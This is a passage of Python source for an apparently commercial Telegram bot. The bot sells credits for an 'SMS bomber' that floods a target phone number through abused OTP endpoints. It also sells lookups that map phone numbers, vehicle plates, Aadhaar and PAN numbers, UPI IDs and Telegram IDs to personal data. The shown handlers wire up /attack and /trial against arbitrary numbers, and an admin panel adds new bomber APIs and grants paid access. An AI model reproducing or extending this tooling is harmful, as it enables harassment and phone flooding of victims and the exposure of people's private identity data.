    else: await update.message.reply_text("ℹ️ No attack running.")

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_chat.type != ChatType.PRIVATE:
        await update.message.reply_text("🤖 <b>Bot is Active!</b>\nUse /help to see group commands.", parse_mode=ParseMode.HTML)
        return

    user = update.effective_user
    current_credits = update_user_credits(user.id, 0, user.username, user.first_name)
    context.user_data['search_mode'] = 'global'
    
    welcome_text = f"""
<b>🛡️ WELCOME TO ULTIMATE TOOLKIT 🛡️</b>

👤 <b>User:</b> {user.mention_html()}
⭐ <b>Credits:</b> <code>{current_credits}</code>

<b>🔥 AVAILABLE SERVICES:</b>
💣 <b>SMS Bomber:</b> /trial, /attack
📞 <b>Global Info:</b> Send Number
🚗 <b>Vehicle RC:</b> Send Plate No.
🔢 <b>RC to Mobile:</b> Send Plate No.
🎮 <b>Free Fire:</b> Send UID
📧 <b>Email:</b> Send Email Address
🇮🇳 <b>Aadhaar:</b> Send Number
🪪 <b>PAN Card:</b> Send Number
📱 <b>Telegram:</b> Send User ID
📸 <b>Instagram:</b> Send Username
💳 <b>FamPay:</b> Send UPI ID
🆔 <b>TG ID TO NUM:</b> Send Telegram ID

🎁 <b>Daily Bonus:</b> Check menu!
    """
    
    # Try sending photo with caption
    try:
        photos = await user.get_profile_photos(limit=1)
        if photos.total_count > 0:
            photo_file = photos.photos[0][-1].file_id
            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=photo_file,
                caption=welcome_text,
                parse_mode=ParseMode.HTML,
                reply_markup=get_main_keyboard()
            )
            return
    except Exception:
        pass
    
    # Fallback to text if no photo
    await update.message.reply_text(welcome_text, parse_mode=ParseMode.HTML, reply_markup=get_main_keyboard())

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_chat.type != ChatType.PRIVATE: return
    text = update.message.text
    user = update.effective_user
    user_id = user.id

    # Admin Logic
    admin_state = context.user_data.get('admin_state')
    if user_id == ADMIN_ID and admin_state:
        if admin_state == 'awaiting_broadcast':
            users = get_all_users()
            sent = 0
            for uid in users:
                try:
                    await context.bot.send_message(chat_id=uid, text=f"📢 <b>ANNOUNCEMENT</b>\n\n{text}", parse_mode=ParseMode.HTML)
                    sent += 1
                except: pass
            await update.message.reply_text(f"✅ Sent to {sent} users.")
        
        elif admin_state == 'awaiting_add_group':
            try:
                parts = text.split()
                if len(parts) >= 2:
                    group_id = int(parts[0])
                    credits = int(parts[1])
                    group_name = ' '.join(parts[2:]) if len(parts) > 2 else f"Group_{group_id}"
                    add_group_credits(group_id, credits, group_name, user_id)
                    await update.message.reply_text(f"✅ Added {credits} credits to group {group_id}\nGroup: {group_name}")
                else:
                    await update.message.reply_text("❌ Format: group_id credits [group_name]")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {e}")
        
        elif admin_state == 'awaiting_remove_group':
            try:
                parts = text.split()
                if len(parts) >= 2:
                    group_id = int(parts[0])
                    credits = int(parts[1])
                    remove_group_credits(group_id, credits)
                    await update.message.reply_text(f"✅ Removed {credits} credits from group {group_id}")
                else:
                    await update.message.reply_text("❌ Format: group_id credits")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {e}")
        
        elif admin_state == 'awaiting_add_bomber_api':
            try:
                # Parse the API from text
                api_data = parse_api_from_text(text)
                
                if api_data:
                    # Add to database
                    api_id = add_custom_bomber_api(api_data, user_id)
                    # Rebuild the ATTACK_APIS list
                    total = rebuild_attack_apis()
                    
                    await update.message.reply_text(
                        f"✅ <b>CUSTOM API ADDED!</b>\n\n"
                        f"🆔 ID: {api_id}\n"
                        f"🌐 URL: {api_data.get('url', 'N/A')[:50]}\n"
                        f"📊 Total APIs now: {total}\n\n"
                        f"Use /admin to manage APIs.",
                        parse_mode=ParseMode.HTML
                    )
                else:
                    await update.message.reply_text(
                        "❌ Could not parse API from text.\n\n"
                        "Please send in one of these formats:\n"
                        "1. URL only: https://api.com/endpoint\n"
                        "2. URL + method + data\n"
                        "3. JSON format with url, method, headers, data\n"
                        "4. Python dictionary format"
                    )
            except Exception as e:
                await update.message.reply_text(f"❌ Error adding API: {e}")
        
        elif admin_state == 'awaiting_add_bomber':
            try:
                parts = text.split()
                if len(parts) == 2:
                    target_id = int(parts[0])
                    days = int(parts[1])
                    set_paid_bomber(target_id, True, days)
                    expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
                    await update.message.reply_text(f"✅ User {target_id} added for {days} days.\nExpires: {expiry}")
                else:
                    await update.message.reply_text("❌ Format: UserID Days (e.g., 12345 30)")
            except: await update.message.reply_text("❌ Invalid input.")
            
        elif admin_state == 'awaiting_remove_bomber':
            try:
                target_id = int(text.strip())
                set_paid_bomber(target_id, False)
                await update.message.reply_text(f"✅ User {target_id} removed from PAID BOMBER.")
            except: await update.message.reply_text("❌ Invalid ID.")
            
        elif admin_state == 'awaiting_add_credits':
            try:
                parts = text.split()
                uid, amount = int(parts[0]), int(parts[1])
                new_balance = update_user_credits(uid, amount)
                await update.message.reply_text(f"✅ <b>CREDITS ADDED SUCCESS</b>\n\n👤 User ID: <code>{uid}</code>\n➕ Added: {amount}\n💰 New Balance: {new_balance}", parse_mode=ParseMode.HTML)
            except: await update.message.reply_text("❌ Format: ID Amount")
            
        elif admin_state == 'awaiting_remove_credits':
            try:
                parts = text.split()
                update_user_credits(int(parts[0]), -int(parts[1]))
                await update.message.reply_text("✅ Credits Removed.")
            except: await update.message.reply_text("❌ Format: ID Amount")
            
        elif admin_state.startswith('setting_api_'):
            api_key = admin_state.replace('setting_api_', '')
            set_api_url(api_key, text.strip())
            await update.message.reply_text(f"✅ <b>API UPDATED: {api_key}</b>", parse_mode=ParseMode.HTML)

        context.user_data['admin_state'] = None
        return

    # Menu Logic
    if text == "💣 SMS BOMBER":
        is_paid, trial_used = get_bomber_status(user_id)
        status = "PAID ✅" if is_paid else ("TRIAL AVAILABLE 🎁" if not trial_used else "EXPIRED ❌")
        await update.message.reply_text(f"<b>💣 SMS BOMBER PANEL</b>\nStatus: {status}\n\n<b>Commands:</b>\n🎁 <b>Trial:</b> <code>/trial 9876543210</code> (60s)\n⚡ <b>Attack:</b> <code>/attack 9876543210 1500</code> (Paid)\n🛑 <b>Stop:</b> <code>/stop</code>", parse_mode=ParseMode.HTML)
        return
    elif text == "📊 MY CREDITS":
        credits = get_user_credits(user.id)
        await update.message.reply_text(f"💰 Credits: <code>{credits}</code>", parse_mode=ParseMode.HTML)
        return
    elif text == "📈 DAILY BONUS":
        success, result = check_and_claim_bonus(user_id)
        if success: await update.message.reply_text(f"🎁 <b>BONUS CLAIMED!</b>\nNew Balance: {result}", parse_mode=ParseMode.HTML)
        else: await update.message.reply_text(f"🛑 {result}", parse_mode=ParseMode.HTML)
        return
    elif text == "👑 OWNER":
        await update.message.reply_text("👑 Owner: @VILAXLORD", parse_mode=ParseMode.HTML)
        return

    # OSINT Mode Selection
    if text == "🔍 PHONE LOOKUP":
        context.user_data['search_mode'] = 'global'
        await update.message.reply_text("📞 <b>MODE: GLOBAL LOOKUP</b>\n👇 Enter Phone Number.", parse_mode=ParseMode.HTML)
        return
    
    elif text == "🚗 VEHICLE LOOKUP":
        context.user_data['search_mode'] = 'vehicle'
        await update.message.reply_text("🚗 <b>MODE: VEHICLE LOOKUP</b>\n👇 Enter Vehicle Number.", parse_mode=ParseMode.HTML)
        return

    elif text == "🔢 VEHICLE TO NUM":
        context.user_data['search_mode'] = 'vehicle_num'
        await update.message.reply_text("🔢 <b>MODE: RC TO MOBILE</b>\n👇 Enter Vehicle Number.", parse_mode=ParseMode.HTML)
        return

    elif text == "🎮 FF LOOKUP":
        context.user_data['search_mode'] = 'ff'
        await update.message.reply_text("🎮 <b>MODE: FREE FIRE LOOKUP</b>\n👇 Enter UID.", parse_mode=ParseMode.HTML)
        return

    elif text == "📧 EMAIL LOOKUP":
        context.user_data['search_mode'] = 'email'
        await update.message.reply_text("📧 <b>MODE: EMAIL LOOKUP</b>\n👇 Enter Email Address.", parse_mode=ParseMode.HTML)
        return

    elif text == "🇮🇳 AADHAAR LOOKUP":
        context.user_data['search_mode'] = 'aadhaar'
        await update.message.reply_text("🇮🇳 <b>MODE: AADHAAR LOOKUP</b>\n👇 Enter Aadhaar Number.", parse_mode=ParseMode.HTML)
        return

    elif text == "🪪 PAN LOOKUP":
        context.user_data['search_mode'] = 'pan'
        await update.message.reply_text("🪪 <b>MODE: PAN LOOKUP</b>\n👇 Enter PAN Number.", parse_mode=ParseMode.HTML)
        return

    elif text == "📱 TELEGRAM LOOKUP":
        context.user_data['search_mode'] = 'telegram'
        await update.message.reply_text("📱 <b>MODE: TELEGRAM LOOKUP</b>\n👇 Enter User ID.", parse_mode=ParseMode.HTML)
        return

    elif text == "📸 INSTAGRAM LOOKUP":
        context.user_data['search_mode'] = 'instagram'
        await update.message.reply_text("📸 <b>MODE: INSTAGRAM LOOKUP</b>\n👇 Enter Username (e.g. im_king).", parse_mode=ParseMode.HTML)
        return

    elif text == "💳 FAMPAY LOOKUP":
        context.user_data['search_mode'] = 'fampay'
        await update.message.reply_text("💳 <b>MODE: FAMPAY LOOKUP</b>\n👇 Enter FamPay ID/UPI.", parse_mode=ParseMode.HTML)
        return

    elif text == "🆔 TG ID TO NUM":
        context.user_data['search_mode'] = 'tgtonum'
        await update.message.reply_text("🆔 <b>MODE: TG ID TO NUMBER</b>\n👇 Enter Telegram ID.", parse_mode=ParseMode.HTML)
        return

    # Handle Search Input
    if not text.startswith('/'):
        mode = context.user_data.get('search_mode', 'global')
        await handle_api_request(update, context, f"api_{mode}", text.strip(), mode.upper())

# --- ADMIN PANEL ---
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    context.user_data['admin_state'] = None
    await update.message.reply_text("👑 <b>ADMIN PANEL</b>", parse_mode=ParseMode.HTML, reply_markup=get_admin_keyboard())

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID: return
    await query.answer()
    data = query.data
    
    if data == 'admin_broadcast':
        context.user_data['admin_state'] = 'awaiting_broadcast'
        await query.message.edit_text("📢 Send broadcast message:")
    
    elif data == 'admin_group_credits':
        groups = get_all_groups_with_credits()
        if not groups:
            await query.message.edit_text("📭 No groups with credits yet.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='admin_panel')]]))
            return
        
        text = "<b>👥 GROUP CREDITS LIST</b>\n\n"
        for group_id, group_name, credits in groups:
            name = (group_name or "Unknown").replace("<", "").replace(">", "")[:20]
            text += f"👥 <b>{name}</b>\n🆔 <code>{group_id}</code>\n💰 Credits: {credits}\n\n"
            if len(text) > 3800:
                text += "\n⚠️ <i>List truncated...</i>"
                break
        
        await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='admin_panel')]]))
    
    elif data == 'admin_add_group':
        context.user_data['admin_state'] = 'awaiting_add_group'
        await query.message.edit_text("➕ <b>ADD GROUP CREDITS</b>\n\nSend: <code>group_id credits [group_name]</code>\n\nExample: <code>-100123456789 50 My Group</code>", parse_mode=ParseMode.HTML)
    
    elif data == 'admin_remove_group':
        context.user_data['admin_state'] = 'awaiting_remove_group'
        await query.message.edit_text("➖ <b>REMOVE GROUP CREDITS</b>\n\nSend: <code>group_id credits</code>\n\nExample: <code>-100123456789 10</code>", parse_mode=ParseMode.HTML)
    
    elif data == 'admin_list_groups':
        groups = get_all_groups_with_credits()
        if not groups:
            await query.message.edit_text("📭 No groups found.")
            return
        
        text = "<b>📋 ALL GROUPS</b>\n\n"
        for group_id, group_name, credits in groups:
            name = (group_name or "Unknown").replace("<", "").replace(">", "")[:20]
            text += f"👥 {name}\n🆔 <code>{group_id}</code>\n💰 {credits} CR\n\n"
        
        await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='admin_panel')]]))
    
    elif data == 'admin_bomber_apis':
        total = rebuild_attack_apis()
        text = f"<b>⚙️ BOMBER APIS</b>\n\n📊 Total APIs: {total}\n📝 Original: {len(ORIGINAL_BOMBER_APIS)}\n📝 New: {len(APIS_PY_APIS)}\n📦 Custom: {len(get_all_custom_apis())}\n\nUse /admin to return."
        await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='admin_panel')]]))
    
    elif data == 'admin_add_bomber_api':
        context.user_data['admin_state'] = 'awaiting_add_bomber_api'
        await query.message.edit_text(
            "➕ <b>ADD CUSTOM BOMBER API</b>\n\n"
            "Send the API in any format. I'll try to parse it.\n\n"
            "Examples:\n\n"
            "<b>Simple:</b>\n"
            "<code>https://api.example.com/send-otp\nPOST\n{\"phone\":\"{phone}\"}</code>\n\n"
            "<b>JSON format:</b>\n"
            "<code>{\n  \"url\": \"https://api.example.com/otp\",\n  \"method\": \"POST\",\n  \"headers\": {\"Content-Type\": \"application/json\"},\n  \"data\": {\"mobile\": \"{phone}\"},\n  \"count\": 5,\n  \"name\": \"My API\",\n  \"type\": \"sms\"\n}</code>\n\n"
            "<b>Python dict:</b>\n"
            "<code>{'url': 'https://api.example.com', 'method': 'POST', 'headers': {}, 'data': 'mobile={phone}', 'count': 10}</code>",
            parse_mode=ParseMode.HTML
        )
    
    elif data == 'admin_list_custom_apis':
        apis = get_all_custom_apis(active_only=False)
        if not apis:
            await query.message.edit_text("📭 No custom APIs found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='admin_panel')]]))
            return
        
        text = "<b>📋 CUSTOM APIS</b>\n\n"
        keyboard = []
        for api in apis[:10]:  # Show first 10
            status = "✅" if api['is_active'] else "❌"
            name = api['api_name'][:15]
            text += f"{status} <b>{name}</b>\n🆔: <code>{api['id']}</code>\n📊 Count: {api['api_count']}\n\n"
            keyboard.append([InlineKeyboardButton(f"{status} {name}", callback_data=f"toggle_api_{api['id']}")])
        
        keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data='admin_panel')])
        await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data.startswith('toggle_api_'):
        api_id = int(data.split('_')[-1])
        conn = sqlite3.connect('bot_users.db')
        cursor = conn.cursor()
        cursor.execute('SELECT is_active FROM custom_bomber_apis WHERE id = ?', (api_id,))
        result = cursor.fetchone()
        if result:
            new_status = not result[0]
            update_custom_api_status(api_id, new_status)
            rebuild_attack_apis()
            await query.message.edit_text(f"✅ API {api_id} {'ENABLED' if new_status else 'DISABLED'}")
        conn.close()
    
    elif data == 'admin_rebuild_apis':
        total = rebuild_attack_apis()
        await query.message.edit_text(f"✅ APIs rebuilt!\n📊 Total APIs: {total}")
    
    elif data == 'admin_apis':
        await query.message.edit_text("⚙️ <b>SELECT API TO CHANGE</b>", parse_mode=ParseMode.HTML, reply_markup=get_api_selection_keyboard())
    
    elif data.startswith('setapi_'):
        api_key = "api_" + data.split('_', 1)[1]
        context.user_data['admin_state'] = f'setting_api_{api_key}'
        current = get_api_url(api_key)
        await query.message.edit_text(f"⚙️ <b>EDITING: {api_key.upper()}</b>\nCurr: <code>{current}</code>\n\n👇 Send New URL (Use {{number}})", parse_mode=ParseMode.HTML)
    
    elif data == 'admin_panel': 
        await admin_panel(update, context)
    
    elif data == 'admin_add_bomber':
        context.user_data['admin_state'] = 'awaiting_add_bomber'
        await query.message.edit_text("🔥 Send: UserID Days\nExample: 123456 30")
    
    elif data == 'admin_remove_bomber':
        context.user_data['admin_state'] = 'awaiting_remove_bomber'
        await query.message.edit_text("🚫 Send User ID to REMOVE Paid Bomber:")
    
    elif data == 'admin_add':
        context.user_data['admin_state'] = 'awaiting_add_credits'
        await query.message.edit_text("💳 Send: UserID Amount")
    
    elif data == 'admin_remove':
        context.user_data['admin_state'] = 'awaiting_remove_credits'
        await query.message.edit_text("💸 Send: UserID Amount")
    
    elif data == 'admin_all_credits':
        conn = sqlite3.connect('bot_users.db')
        cursor = conn.cursor()
        cursor.execute('SELECT user_id, first_name, credits FROM users ORDER BY credits DESC')
        users = cursor.fetchall()
        conn.close()
        
        if not users:
            await query.message.edit_text("📭 Database Empty.")
            return
            
        text = "<b>📋 ALL USERS CREDITS</b>\n\n"
        for uid, name, creds in users:
            safe_name = (name or "Unknown").replace("<", "").replace(">", "")[:15]
            text += f"👤 <b>{safe_name}</b> (<code>{uid}</code>): {creds} CR\n"
            if len(text) > 3800:
                text += "\n⚠️ <i>List truncated...</i>"
                break
        
        await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='admin_panel')]]))
    
    elif data == 'admin_paid_bombers':
        conn = sqlite3.connect('bot_users.db')
        cursor = conn.cursor()
        cursor.execute('SELECT user_id, first_name, bomber_expire_date FROM users WHERE is_paid_bomber = 1')
        users = cursor.fetchall()
        conn.close()
        
        if not users:
            await query.message.edit_text("📭 No paid bombers found.")
            return
            
        text = "<b>⏳ PAID BOMBERS LIST</b>\n\n"
        for uid, name, expiry in users:
            safe_name = (name or "Unknown").replace("<", "").replace(">", "")[:15]
            try:
                days_left = (datetime.fromisoformat(expiry) - datetime.now()).days if expiry else "Forever"
            except: days_left = "Unknown"
            
            text += f"👤 <b>{safe_name}</b> (<code>{uid}</code>)\n📅 Days Left: {days_left}\n\n"
            if len(text) > 3800:
                text += "\n⚠️ <i>List truncated...</i>"
                break
        
        await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='admin_panel')]]))
    
    elif data == 'back_main':
        await query.message.delete()
        await query.message.reply_text("Menu Closed")

# --- MAIN ---
def main():
    requests.packages.urllib3.disable_warnings()
    
    # Initialize database and rebuild APIs
    init_database()
    rebuild_attack_apis()
    
    request = HTTPXRequest(connect_timeout=60, read_timeout=60)
    app = Application.builder().token(TOKEN).request(request).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("help", cmd_help))

    # Bomber Commands
    app.add_handler(CommandHandler("trial", cmd_trial))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("stop", cmd_stop))
    
    # OSINT Commands (Group Compatible)
    app.add_handler(CommandHandler("num", cmd_num))
    app.add_handler(CommandHandler("ff", cmd_ff))
    app.add_handler(CommandHandler("email", cmd_email))
    app.add_handler(CommandHandler("vehicle", cmd_vehicle))
    app.add_handler(CommandHandler("rctonum", cmd_rctonum))
    app.add_handler(CommandHandler("aadhaar", cmd_aadhaar))
    app.add_handler(CommandHandler("pan", cmd_pan))
    app.add_handler(CommandHandler("tg", cmd_tg))
    app.add_handler(CommandHandler("insta", cmd_insta))
    app.add_handler(CommandHandler("fampay", cmd_fampay))
    app.add_handler(CommandHandler("tgtonum", cmd_tgtonum))
    
    app.add_handler(CallbackQueryHandler(admin_callback, pattern='^admin_|^back_|^setapi_|^toggle_api_'))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print(f"🤖 BOT STARTED - OSINT + BOMBER ACTIVE")
    print(f"📊 Total APIs: {TOTAL_APIS}")
    app.run_polling()

if __name__ == '__main__':
    main()